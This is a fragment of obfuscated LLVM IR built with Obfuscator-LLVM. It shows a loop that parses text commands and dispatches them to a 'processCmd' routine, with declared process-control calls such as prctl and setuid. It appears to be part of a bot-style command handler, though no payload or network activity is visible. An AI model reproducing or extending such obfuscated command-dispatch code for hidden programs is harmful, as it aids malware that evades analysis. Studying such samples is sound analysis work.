  %114 = load i8, i8* %113, align 1
  switch i8 %114, label %.preheader75.preheader [
    i8 13, label %115
    i8 10, label %115
  ]

.preheader75.preheader:                           ; preds = %110
  br label %.preheader75

; <label>:115:                                    ; preds = %110, %110
  store i8 0, i8* %113, align 1
  br label %110

.preheader75:                                     ; preds = %.preheader75.preheader, %117
  %.064 = phi i8* [ %118, %117 ], [ %109, %.preheader75.preheader ]
  %116 = load i8, i8* %.064, align 1
  switch i8 %116, label %117 [
    i8 32, label %119
    i8 0, label %119
  ]

; <label>:117:                                    ; preds = %.preheader75
  %118 = getelementptr inbounds i8, i8* %.064, i64 1
  br label %.preheader75

; <label>:119:                                    ; preds = %.preheader75, %.preheader75
  store i8 0, i8* %.064, align 1
  %120 = getelementptr inbounds i8, i8* %.064, i64 1
  %121 = load i8, i8* %109, align 1
  %122 = icmp eq i8 %121, 0
  br i1 %122, label %._crit_edge97, label %.lr.ph96.preheader

.lr.ph96.preheader:                               ; preds = %119
  br label %.lr.ph96

.lr.ph96:                                         ; preds = %.lr.ph96.preheader, %.lr.ph96
  %123 = phi i8 [ %128, %.lr.ph96 ], [ %121, %.lr.ph96.preheader ]
  %.06294 = phi i8* [ %127, %.lr.ph96 ], [ %109, %.lr.ph96.preheader ]
  %124 = zext i8 %123 to i32
  %125 = call i32 @toupper(i32 %124) #14
  %126 = trunc i32 %125 to i8
  store i8 %126, i8* %.06294, align 1
  %127 = getelementptr inbounds i8, i8* %.06294, i64 1
  %128 = load i8, i8* %127, align 1
  %129 = icmp eq i8 %128, 0
  br i1 %129, label %._crit_edge97.loopexit, label %.lr.ph96

._crit_edge97.loopexit:                           ; preds = %.lr.ph96
  br label %._crit_edge97

._crit_edge97:                                    ; preds = %._crit_edge97.loopexit, %119
  %130 = call i8* @strtok(i8* %120, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i64 0, i64 0)) #7
  store i8* %109, i8** %48, align 16
  %131 = icmp eq i8* %130, null
  br i1 %131, label %._crit_edge102.thread, label %.lr.ph101.preheader

.lr.ph101.preheader:                              ; preds = %._crit_edge97
  br label %.lr.ph101

._crit_edge102.thread:                            ; preds = %._crit_edge97
  call void @processCmd(i32 1, i8** nonnull %48)
  br label %.backedge

.lr.ph101:                                        ; preds = %.lr.ph101.preheader, %144
  %.06099 = phi i8* [ %145, %144 ], [ %130, %.lr.ph101.preheader ]
  %.06198 = phi i32 [ %.1, %144 ], [ 1, %.lr.ph101.preheader ]
  %132 = load i8, i8* %.06099, align 1
  %133 = icmp eq i8 %132, 10
  br i1 %133, label %144, label %134

; <label>:134:                                    ; preds = %.lr.ph101
  %135 = call i64 @strlen(i8* nonnull %.06099) #14
  %136 = add i64 %135, 1
  %137 = call noalias i8* @malloc(i64 %136) #7
  %138 = sext i32 %.06198 to i64
  %139 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 %138
  store i8* %137, i8** %139, align 8
  %140 = call i64 @strlen(i8* nonnull %.06099) #14
  %141 = add i64 %140, 1
  call void @llvm.memset.p0i8.i64(i8* %137, i8 0, i64 %141, i32 1, i1 false)
  %142 = call i8* @strcpy(i8* %137, i8* nonnull %.06099) #7
  %143 = add nsw i32 %.06198, 1
  br label %144

; <label>:144:                                    ; preds = %.lr.ph101, %134
  %.1 = phi i32 [ %143, %134 ], [ %.06198, %.lr.ph101 ]
  %145 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i64 0, i64 0)) #7
  %146 = icmp eq i8* %145, null
  br i1 %146, label %._crit_edge102, label %.lr.ph101

._crit_edge102:                                   ; preds = %144
  call void @processCmd(i32 %.1, i8** nonnull %48)
  %147 = icmp sgt i32 %.1, 1
  br i1 %147, label %.lr.ph105.preheader, label %.backedge

.lr.ph105.preheader:                              ; preds = %._crit_edge102
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph105

.lr.ph105:                                        ; preds = %.lr.ph105.preheader, %.lr.ph105
  %indvars.iv115 = phi i64 [ %indvars.iv.next116, %.lr.ph105 ], [ 1, %.lr.ph105.preheader ]
  %148 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 %indvars.iv115
  %149 = load i8*, i8** %148, align 8
  call void @free(i8* %149) #7
  %indvars.iv.next116 = add nuw nsw i64 %indvars.iv115, 1
  %exitcond = icmp eq i64 %indvars.iv.next116, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph105

.loopexit78.loopexit:                             ; preds = %.backedge
  br label %.loopexit78

.loopexit78.loopexit126:                          ; preds = %36
  br label %.loopexit78

.loopexit78:                                      ; preds = %.loopexit78.loopexit126, %.loopexit78.loopexit, %27, %40
  ret i32 0
}

declare i32 @prctl(...) local_unnamed_addr #3

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setuid(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @seteuid(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #14

attributes #0 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { nounwind readonly }
attributes #15 = { nounwind readnone }
attributes #16 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = !{i32 -2146520450}
!5 = !{!6}
!6 = distinct !{!6, !7}
!7 = distinct !{!7, !"LVerDomain"}
!8 = !{!9}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !11}
!11 = !{!"llvm.loop.unroll.disable"}
!12 = distinct !{!12, !2, !3}
!13 = distinct !{!13, !2, !3}
!14 = !{i32 -2146519322}
!15 = !{i32 -2146517882}
!16 = distinct !{!16, !2, !3}
!17 = distinct !{!17, !18, !2, !3}
!18 = !{!"llvm.loop.unroll.runtime.disable"}
!19 = !{i32 -2146516943}
